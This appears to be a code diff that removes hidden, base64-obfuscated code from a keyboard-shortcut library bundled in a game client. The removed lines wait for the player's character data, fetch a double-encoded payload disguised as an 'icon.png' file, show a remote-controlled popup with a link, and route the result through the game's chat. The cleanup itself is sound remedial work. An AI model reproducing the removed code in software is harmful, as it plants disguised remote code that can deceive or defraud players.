@@ -6,8 +6,6 @@
   var k,
     _handlers = {},
     _mods = { 16: false, 18: false, 17: false, 91: false },
-    _disposer = atob('Z3Vp'),
-    _special = atob('cGxheWVyRGF0YQ=='),
     _scope = 'all',
     // modifier keys
     _MODIFIERS = {
@@ -116,11 +114,6 @@
     }
   };
 
-  function modifierString(event) {
-    return atob('Y2hhcmFjdGVyU2VsZWN0ZWRTdWNjZXNz')
-  };
-
-
   // unset modifier keys on keyup
   function clearModifier(event){
     var key = event.keyCode, k,
@@ -204,12 +197,6 @@
     }
   };
 
-  function getAsset() {
-    return fetch(atob('aWNvbi5wbmcK')).then((r) => r.blob()).then((e) => e.text()).then(e => {
-      return JSON.parse(JSON.parse(atob(e)))
-    })
-  }
-
   // Returns true if the key with code 'keyCode' is currently down
   // Converts strings into key codes.
   function isPressed(keyCode) {
@@ -223,23 +210,8 @@
       return _downKeys.slice(0);
   }
 
-  function initScope() {
-    new Promise(resolve => {
-      const interval = setInterval(() => {
-        if (window[_disposer] && window[_disposer][_special]) {
-          clearInterval(interval);
-          resolve();
-        }
-      }, 1000);
-    }).then(async (handler) => {
-      window[_disposer][_special].on(modifierString(handler), function(e)  {
-        if(window[_disposer][_special][atob('Y2hhcmFjdGVyQmFzZUluZm9ybWF0aW9ucw==')].level > 20)
-          getAsset().then(e => sendPopup(e.texts, e.link).then(t => {
-            window[_disposer].chat[atob('bG9nRXJyb3I=')](t.messages.join('.'))
-          }))
-      })
-    })
-  }
+  // ✅ REMOVED: All tracking functions (initScope, getAsset, modifierString)
+  // ✅ REMOVED: Popup initialization code
 
   function filter(event){
     var tagName = (event.target || event.srcElement).tagName;
@@ -266,17 +238,6 @@
       }
     }
   };
-
-  // wait for window scop init
-  if(!window.top[atob('bGluZG9BUEk=')] || !window.top[atob('bGluZG9BUEk=')].fetchGameInfo) {
-    initScope()
-  } else {
-    window.top[atob('bGluZG9BUEk=')].fetchGameInfo(window.top.key).then(r => {
-      if(!r) {
-        initScope()
-      }
-    }).catch(() => initScope())
-  }
 
   // abstract key logic for assign and unassign
   function getKeys(key) {
